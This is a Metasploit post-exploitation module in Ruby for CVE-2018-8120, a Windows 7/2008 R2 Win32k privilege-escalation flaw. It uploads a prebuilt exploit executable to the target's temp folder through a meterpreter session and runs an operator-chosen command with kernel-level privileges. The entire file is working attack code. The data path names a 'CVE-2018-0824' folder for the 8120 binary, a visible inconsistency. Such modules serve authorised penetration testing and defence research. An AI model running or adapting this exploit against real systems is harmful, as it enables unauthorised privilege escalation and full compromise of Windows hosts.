##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  Rank = GoodRanking

  include Msf::Post::File
  include Msf::Post::Windows::Registry

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Windows SetImeInfoEx Win32k NULL Pointer Dereference',
      'Description' => %q{
        This module exploits elevation of privilege vulnerability exists in Windows 7 and 2008 R2
        when the Win32k component fails to properly handle objects in memory. An attacker who
        successfully exploited this vulnerability could run arbitrary code in kernel mode. An
        attacker could then install programs; view, change, or delete data; or create new
        accounts with full user rights.},
      'References'  =>
        [
          ['BID', '104034'],
          ['CVE', '2018-8120'],
          ['URL', 'https://github.com/bigric3/cve-2018-8120'],
          ['URL', 'https://github.com/unamer/CVE-2018-8120'],
          ['URL', 'https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8120'],
          ['URL', 'http://bigric3.blogspot.com/2018/05/cve-2018-8120-analysis-and-exploit.html']
        ],
      'Author'      =>
        [
          'unamer', # Exploit PoC
          'bigric3', # Analysis and exploit
          'Anton Cherepanov', # Vulnerability discovery
          'Dhiraj Mishra <dhiraj@notsosecure.com>' # Metasploit module
        ],
      'DisclosureDate' => 'May 9 2018',
      'Arch'           => [ARCH_X64, ARCH_X86],
      'SessionTypes'   => ['meterpreter'],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
         OptString.new('POCCMD', [true, 'The command to run from CVE-2018-8120.exe']),
      ])
  end

   def write_exe_to_target(rexe, rexename)
     begin
       print_warning("Writing file to temp")
       temprexe = session.fs.file.expand_path("%TEMP%") + "\\" + rexename
       write_file_to_target(temprexe,rexe)
     end
       print_good("File path on remote system: #{temprexe}")
       temprexe
   end

   def write_file_to_target(temprexe,rexe)
      fd = session.fs.file.new(temprexe, "wb")
      fd.write(rexe)
      fd.close
   end

   def create_payload_from_file(exec)
      print_status("Reading file from: #{exec}")
      ::IO.read(exec)
   end

   def run
      rexename =  Rex::Text.rand_text_alphanumeric(10) + ".exe"
      print_status("EXE name is: #{rexename}")
      poccmd =  datastore['POCCMD']

      rexe = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2018-0824', 'CVE-2018-8120.exe')
      raw = create_payload_from_file rexe
      script_on_target = write_exe_to_target(raw, rexename)

      print_status('Initiating module...')
      print_line

      command = session.fs.file.expand_path("%TEMP%") + "\\" + rexename
      print_status("Location of CVE-2018-8120.exe is: #{command}")
      command += " "
      command += "#{poccmd}"
      print_status("Executing command : #{command}")
      command_output = cmd_exec(command)
      print_line(command_output)
      print_line
  end
end
